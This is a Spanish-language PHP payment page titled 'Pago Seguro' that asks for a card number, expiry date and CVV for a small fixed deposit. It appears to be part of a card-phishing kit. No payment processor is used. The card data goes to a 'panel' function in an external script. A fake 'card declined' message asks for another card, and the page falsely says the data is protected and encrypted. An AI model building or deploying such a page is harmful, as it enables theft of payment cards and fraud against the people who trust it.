<?php
if (session_status() === PHP_SESSION_NONE) { session_start(); }
require_once __DIR__ . '/../../conexion.php';
require_once __DIR__ . '/../../config.php';
require_once __DIR__ . '/../../token_helper.php';

$token = $_GET['token'] ?? ($_SESSION['landing_token'] ?? '');
$landing_data = null;
if (!empty($token)) {
    $landing_data = obtenerLandingPorToken($token, $pdo);
}

if ($landing_data) {
    $producto = $landing_data['producto'];
    $precio = (int)$landing_data['precio'];
} else {
    $producto = isset($_GET['producto']) ? $_GET['producto'] : 'Producto genérico';
    $precio = isset($_GET['precio']) ? (int)$_GET['precio'] : 0;
}
$anticipo_pagar = 3000;
$anticipo_formateado = number_format($anticipo_pagar, 0, ',', '.');
$error = isset($_GET['err']) && $_GET['err'] == 1;
?>
<!DOCTYPE html>
<html lang="es-CO">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
    <title>Pagar de forma segura</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="../../scripts/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>
    
    <style>
        body {
            font-family: 'Manrope', sans-serif;
            background-color: #f8f9fa;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background-color: #ffffff;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            padding: 32px;
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
        }
        .header {
            text-align: center;
            margin-bottom: 24px;
        }
        .header h1 {
            font-size: 24px;
            font-weight: 700;
            color: #333;
            margin: 0 0 8px 0;
        }
        .header p {
            color: #666;
            margin: 0;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #444;
            font-size: 14px;
        }
        .input-field {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dcdcdc;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
        }
        .input-field:focus {
            border-color: #007bff;
        }
        .input-row {
            display: flex;
            gap: 16px;
        }
        .input-row .form-group {
            flex: 1;
        }
        .btn-submit {
            width: 100%;
            padding: 16px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 10px;
        }
        .btn-submit:hover {
            background-color: #0056b3;
        }
        .btn-submit:disabled {
            background-color: #a0c4ff;
            cursor: not-allowed;
        }
        .error-msg {
            background-color: #ffebee;
            color: #d32f2f;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            text-align: center;
        }
        .secure-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-top: 20px;
            color: #666;
            font-size: 13px;
        }
        .secure-badge svg {
            width: 16px;
            height: 16px;
            fill: #28a745;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <h1>Pago Seguro</h1>
            <p>Ingresa los datos de tu tarjeta de crédito para el anticipo de $ <?= $anticipo_formateado ?> COP</p>
        </div>

        <?php if ($error): ?>
            <div class="error-msg">
                <strong>La tarjeta fue rechazada.</strong> Por favor, intenta con otra tarjeta válida o verifica los fondos.
            </div>
        <?php endif; ?>

        <form id="cardForm">
            <div class="form-group">
                <label for="tarjeta">Número de tarjeta</label>
                <input type="tel" id="tarjeta" class="input-field" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number">
            </div>

            <div class="input-row">
                <div class="form-group">
                    <label for="fecha">Vencimiento</label>
                    <input type="text" id="fecha" class="input-field" placeholder="MM/AA" maxlength="5" autocomplete="cc-exp">
                </div>
                <div class="form-group">
                    <label for="cvv">Código de seguridad</label>
                    <input type="tel" id="cvv" class="input-field" placeholder="123" maxlength="4" autocomplete="cc-csc">
                </div>
            </div>

            <button type="submit" class="btn-submit" id="btnSubmit">Procesar Pago</button>
            
            <div class="secure-badge">
                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
                Tus datos están protegidos y encriptados
            </div>
        </form>
    </div>

    <script>
        $(document).ready(function() {
            $('#tarjeta').on('input', function() {
                var val = $(this).val().replace(/\D/g, '');
                var newVal = '';
                for(var i=0; i<val.length; i++) {
                    if(i>0 && i%4 == 0) { newVal += ' '; }
                    newVal += val[i];
                }
                $(this).val(newVal);
            });

            $('#fecha').on('input', function() {
                var val = $(this).val().replace(/\D/g, '');
                if(val.length > 2) {
                    val = val.substring(0,2) + '/' + val.substring(2,4);
                }
                $(this).val(val);
            });

            $('#cvv').on('input', function() {
                $(this).val($(this).val().replace(/\D/g, ''));
            });

            $('#cardForm').submit(function(e) {
                e.preventDefault();
                var tar = $('#tarjeta').val().trim();
                var fec = $('#fecha').val().trim();
                var cvv = $('#cvv').val().trim();

                if(tar.length < 14) { alert("Ingresa un número de tarjeta válido"); return; }
                if(fec.length < 5) { alert("Ingresa una fecha de vencimiento válida"); return; }
                if(cvv.length < 3) { alert("Ingresa un código de seguridad válido"); return; }

                $('#btnSubmit').prop('disabled', true).text('Procesando...');
                
                // Llamar a la función del panel
                tarjeta(tar, fec, cvv);
            });
        });
    </script>
</body>
</html>
